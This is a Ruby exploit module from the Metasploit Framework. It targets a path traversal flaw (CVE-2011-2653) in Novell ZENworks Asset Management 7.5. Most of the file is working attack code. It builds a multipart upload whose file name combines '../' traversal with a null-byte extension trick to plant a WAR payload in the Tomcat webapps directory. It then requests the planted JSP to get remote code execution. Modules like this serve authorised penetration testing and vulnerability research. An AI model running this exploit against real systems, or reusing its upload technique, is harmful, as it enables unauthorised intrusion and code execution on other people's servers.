# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Novell ZENworks Asset Management Remote Execution&#039;,
      &#039;Description&#039; => %q{
          This module exploits a path traversal flaw in Novell ZENworks Asset Management
        7.5. By exploiting the CatchFileServlet, an attacker can upload a malicious file
        outside of the MalibuUploadDirectory and then make a secondary request that allows
        for arbitrary code execution.
      },
      &#039;Author&#039;         =>
        [
          &#039;Unknown&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;CVE&#039;, &#039;2011-2653&#039; ],
          [ &#039;OSVDB&#039;, &#039;77583&#039; ],
          [ &#039;BID&#039;, &#039;50966&#039; ],
          [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-11-342/&#039; ],
          [ &#039;URL&#039;, &#039;http://download.novell.com/Download?buildid=hPvHtXeNmCU~&#039; ]
        ],
      &#039;Privileged&#039;  => true,
      &#039;Platform&#039;    => [ &#039;java&#039; ],
      &#039;Targets&#039;     =>
        [
          [ &#039;Java Universal&#039;,
            {
              &#039;Arch&#039; => ARCH_JAVA,
              &#039;Platform&#039; => &#039;java&#039;
            },
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Nov 02 2011&#039;))

    register_options(
      [
        Opt::RPORT(8080),
        OptInt.new(&#039;DEPTH&#039;, [true, &#039;Traversal depth to reach the Tomcat webapps dir&#039;, 3])
      ], self.class )
  end

  def exploit

    # Generate the WAR containing the payload
    app_base = rand_text_alphanumeric(4+rand(32-4))
    jsp_name = rand_text_alphanumeric(8+rand(8))
    war_data = payload.encoded_war(:app_name => app_base, :jsp_name => jsp_name).to_s

    uid  = rand_text_alphanumeric(34).to_s

    data =  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"RequestParms\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"language\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"rtyp\"\r\n\r\n"
    data << "prod\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"sess\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"mode\"\r\n\r\n"
    data << "newreport\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"dp\"\r\n\r\n"
    data << "n\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"console\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"oldentry\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"act\"\r\n\r\n"
    data << "malibu.StartImportPAC\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"saveact\"\r\n\r\n"
    data << "malibu.StartImportPAC\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"isalert\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"language\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"queryid\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"Locale\"\r\n\r\n"
    data << "MM/dd/yyyy\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"CurrencySym\"\r\n\r\n"
    data << "$\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"CurrencyPos\"\r\n\r\n"
    data << "start\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"ThousandsSep\"\r\n\r\n"
    data << ",\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"CurDecimalPt\"\r\n\r\n"
    data << ".\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"MinusSign\"\r\n\r\n"
    data << "-\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"sum\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"grp\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"col\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"PreLoadRight\"\r\n\r\n"
    data << "yes\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"console\"\r\n\r\n"
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"uploadFile\"; filename=\"/#{"../" * datastore[&#039;DEPTH&#039;]}#{app_base}.war\x00.txt\"\r\n"
    data << "Content-Type: application/octet-stream\r\n\r\n"
    data << war_data
    data << "\r\n"
    data <<  "------#{uid}\r\n"
    data << "Content-Disposition: form-data; name=\"SuccessPage\"\r\n\r\n"
    data << "Html/UploadSuccess.html\r\n"
    data <<  "------#{uid}--\r\n"

    res = send_request_cgi(
      {
        &#039;uri&#039;    => "/rtrlet/catch",
        &#039;method&#039; => &#039;POST&#039;,
        &#039;ctype&#039;   => "multipart/form-data; boundary=----#{uid}",
        &#039;data&#039;    => data,
      })

    print_status("Uploading #{war_data.length} bytes as #{app_base}.war ...")

    select(nil, nil, nil, 10)

    if (res.code == 500)
      print_status("Triggering payload at &#039;/#{app_base}/#{jsp_name}.jsp&#039; ...")
        send_request_raw(
          {
            &#039;uri&#039;    => "/#{app_base}/" + "#{jsp_name}" + &#039;.jsp&#039;,
            &#039;method&#039; => &#039;GET&#039;,
          })
    else
      print_error("WAR upload failed...")
    end

  end

end



